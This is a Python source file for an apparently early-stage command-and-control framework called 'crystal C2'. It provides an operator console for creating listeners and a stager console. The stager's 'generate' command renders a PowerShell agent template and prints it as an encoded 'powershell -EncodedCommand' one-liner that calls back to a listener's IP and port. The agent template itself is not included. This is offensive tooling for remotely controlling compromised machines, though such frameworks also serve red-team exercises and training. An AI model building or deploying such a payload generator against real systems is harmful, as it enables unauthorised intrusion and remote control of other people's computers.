#!/bin/python3
from server.models import ListenerModel
from server.server import CrystalServer
from lib.helpers.encoder import powershell_encode
import jinja2
from lib.helpers.output import Color, failure, get_random_string, show_options, success
import os, sys
import random, requests
from cmd import Cmd

def get_banner():
    banners = [
        f"""{Color.P}
                              __         .__   
  ___________ ___.__. _______/  |______  |  |  
_/ ___\_  __ <   |  |/  ___/\   __\__  \ |  |  
\  \___|  | \/\___  |\___ \  |  |  / __ \|  |__
 \___  >__|   / ____/____  > |__| (____  /____/
     \/       \/         \/            \/      
"""
    ]

    subline = "\ncrystal C2 v0.0.1\n"
    return f"{random.choice(banners)}{Color.B}{subline}{Color.NC}"

API_BASE = "http://127.0.0.1:9292" # TODO read from config

class Api:
    @staticmethod
    def get_listeners():
        listeners = requests.get(f'{API_BASE}/api/listeners').json()['data']
        return listeners

    @staticmethod
    def create_listener(listen_ip="127.0.0.1", port=1337, name=""):
        if name == "":
            name = get_random_string(8)

        response = requests.post(
            f'{API_BASE}/api/listeners',
            data={
                "name": name,
                "ip_address": listen_ip,
                "port": port
            }
        )
        
        if response.status_code == 500:
            raise ValueError('The listener could not be created.') # TODO create exception class
        else:
            return response


class BaseConsole(Cmd):
    emptyline = lambda x: None

    def __init__(self, encapsulatingConsole = None):
        super().__init__()
        self.encapsulatingConsole = encapsulatingConsole

    def cmdloop(self):
        try:
            Cmd.cmdloop(self)

        except KeyboardInterrupt as e:
            try:
                choice = input(f"\n{Color.R}[!]{Color.NC} Exit? [y/N]")
                if choice.lower() != "" and choice.lower()[0] == "y":
                    sys.exit(0)
                else:
                    self.cmdloop()
            except KeyboardInterrupt as e:
                print("")
                self.cmdloop()

    def do_exit(self, inp):
        sys.exit(0)

    def help_exit(self):
        print("Exit the console.")
        print("You can also use the Ctrl-D shortcut.")

    def do_listeners(self, args):
        """
        List all listeners
        """
        print("IP\t\tPort\tName")
        print("----------------------------------")
        for l in Api.get_listeners():
            print(f"{l['ip_address']}\t{l['port']}\t{l['name']}")

    def help_listeners(self, args):
        print("List all listeners")


    do_EOF = do_exit
    help_EOF = help_exit

    # escape subconsole
    def do_back(self, args):
        if self.encapsulatingConsole:
            self.encapsulatingConsole.cmdloop()
        else:
            print(f"{Color.R}[!]{Color.NC} Type 'exit' to exit.")


class StagerConsole(BaseConsole):
    prompt = f"({Color.B}crystal{Color.NC}) {Color.G}createstager{Color.NC} > "
    
    options = {
        "listener": "",
    }

    def do_options(self, args):
        show_options(self.options)
    
    def help_options(self, args):
        print("Show available options")

    def do_set(self, option):
        try:
            option, value = option.split()
            if option in self.options.keys() and value != '':
                self.options[option] = value
        except:
            print("Usage: set OPTION VALUE")

    def complete_set(self, text, line, begidx, endidx):
        return [option for option in self.options if option.startswith(text)]

    def do_generate(self, args):
        # read in powershell agent template
        templateLoader = jinja2.FileSystemLoader(searchpath="./lib/agents")
        templateEnv = jinja2.Environment(loader=templateLoader)
        TEMPLATE_FILE = "agent.ps1"
        template = templateEnv.get_template(TEMPLATE_FILE)

        # render with listeners ip and port
        agent_payload = template.render(
            LISTENER_IP="127.0.0.1", # TODO: read from options
            LISTENER_PORT=1337            
        )

        payload = f"powershell -EncodedCommand {powershell_encode(agent_payload)}"
        print(payload)

    def help_generate(self):
        print("Generate a payload for the current stager")


class CrystalConsole(BaseConsole):
    """
    Main console
    """
    prompt = f"({Color.B}crystal{Color.NC}) > "

    # print banner
    def do_banner(self, args):
        print(get_banner())

    def help_banner(self):
        print("Show a random banner")

    # create listener
    def do_createlistener(self, args):
        # TODO port, ip etc in subconsole
        try:
            response = Api.create_listener() 
            created = response.json()
            success(f"Listener {created['name']} listening on {created['ip_address']}:{created['port']}")
        except ValueError as e:
            failure(e)
            
    def help_createlistener(self):
        print("Create a listener")

    # ===============================
    # create stager
    def do_createstager(self, args):
        StagerConsole(self).cmdloop()
            
    def help_createlistener(self):
        print("Create a listener")


if __name__ == '__main__':

    if len(sys.argv) != 2:
        print("Usage: crystalc2 [server | client]")

    print(get_banner())

    if sys.argv[1] == "server":
        CrystalServer().cmdloop()

    elif sys.argv[1] == "client":
        CrystalConsole().cmdloop()

    else:
        print("Usage: crystalc2 [server | client]")
